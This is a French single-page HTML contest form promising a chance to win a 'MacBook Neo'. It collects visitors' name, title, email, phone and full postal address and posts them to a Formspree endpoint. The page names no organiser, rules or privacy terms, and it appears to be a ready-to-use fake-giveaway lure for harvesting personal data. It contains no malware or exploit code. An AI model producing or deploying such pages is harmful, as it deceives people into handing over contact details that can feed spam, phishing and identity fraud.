<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MacBook Neo</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  background: linear-gradient(135deg, #0ea5e9, #1e3a8a);
  color: white;
}

/* CONTAINER */
.container {
  padding: 20px;
  text-align: center;
}

/* CARD */
.card {
  max-width: 420px;
  margin: auto;
  background: rgba(255,255,255,0.1);
  backdrop-filter: blur(20px);
  border-radius: 20px;
  padding: 25px;
  box-shadow: 0 20px 50px rgba(0,0,0,0.3);
}

/* IMAGE */
img.main {
  width: 100%;
  border-radius: 20px;
  margin-bottom: 20px;
}

/* TEXT */
h1, h2 {
  margin-bottom: 10px;
}

p {
  color: #e0f2fe;
}

/* BUTTON */
.btn {
  background: linear-gradient(135deg, #06b6d4, #2563eb);
  border: none;
  padding: 14px;
  border-radius: 25px;
  color: white;
  font-weight: bold;
  cursor: pointer;
  width: 100%;
  margin-top: 20px;
}

/* INPUT */
input {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 10px;
  border: none;
}

/* CIVILITE FIX MOBILE */
.civilite {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;
}

.civilite button {
  flex: 1;
  padding: 12px;
  border-radius: 20px;
  border: 2px solid rgba(255,255,255,0.4);
  background: transparent;
  color: white;
  font-size: 16px;
  cursor: pointer;
  transition: 0.2s;
}

.civilite button.active {
  background: linear-gradient(135deg, #06b6d4, #2563eb);
  border: none;
}

/* HIDDEN */
.hidden {
  display: none;
}

.success {
  font-size: 50px;
  margin-bottom: 10px;
}
</style>

</head>

<body>

<div class="container">

<!-- PAGE 1 -->
<div id="step1" class="card">
  <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=1000&q=80">
  <h1>Gagnez le MacBook Neo</h1>
  <p>Participez gratuitement pour tenter de remporter ce modèle dernière génération.</p>
  <button class="btn" onclick="showForm()">Participer</button>
</div>

<!-- PAGE 2 -->
<div id="step2" class="card hidden">
  <img class="main" src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853?auto=format&fit=crop&w=1000&q=80">
  <h2>Inscription</h2>

  <form id="contestForm">

    <!-- CIVILITE -->
    <div class="civilite">
      <button type="button" onclick="setCivilite(this, 'Mr')">Mr</button>
      <button type="button" onclick="setCivilite(this, 'Mme')">Mme</button>
    </div>

    <input type="text" id="nom" placeholder="Nom" required>
    <input type="text" id="prenom" placeholder="Prénom" required>
    <input type="text" id="email" placeholder="Email" required>
    <input type="text" id="telephone" placeholder="Téléphone" required>
    <input type="text" id="adresse" placeholder="Adresse postale complète" required>

    <button class="btn" type="submit">Valider</button>
  </form>
</div>

<!-- PAGE 3 -->
<div id="step3" class="card hidden">
  <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=1000&q=80">
  <div class="success">🎉</div>
  <h2>Bravo !</h2>
  <p>Votre participation a bien été enregistrée.</p>
  <p>Les résultats vous seront communiqués prochainement.</p>
</div>

</div>

<script>
let civilite = "";

/* SELECT CIVILITE */
function setCivilite(el, value) {
  civilite = value;

  document.querySelectorAll(".civilite button").forEach(btn => {
    btn.classList.remove("active");
  });

  el.classList.add("active");
}

/* NAVIGATION */
function showForm() {
  document.getElementById("step1").classList.add("hidden");
  document.getElementById("step2").classList.remove("hidden");
}

/* SUBMIT */
document.getElementById("contestForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const nom = document.getElementById("nom").value;
  const prenom = document.getElementById("prenom").value;
  const email = document.getElementById("email").value.toLowerCase();
  const telephone = document.getElementById("telephone").value;
  const adresse = document.getElementById("adresse").value;

  if (!civilite || !nom || !prenom || !email || !telephone || !adresse) {
    alert("Veuillez remplir tous les champs");
    return;
  }

  fetch("https://formspree.io/f/xnjozjby", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ civilite, nom, prenom, email, telephone, adresse })
  });

  document.getElementById("step2").classList.add("hidden");
  document.getElementById("step3").classList.remove("hidden");
});
</script>

</body>
</html>
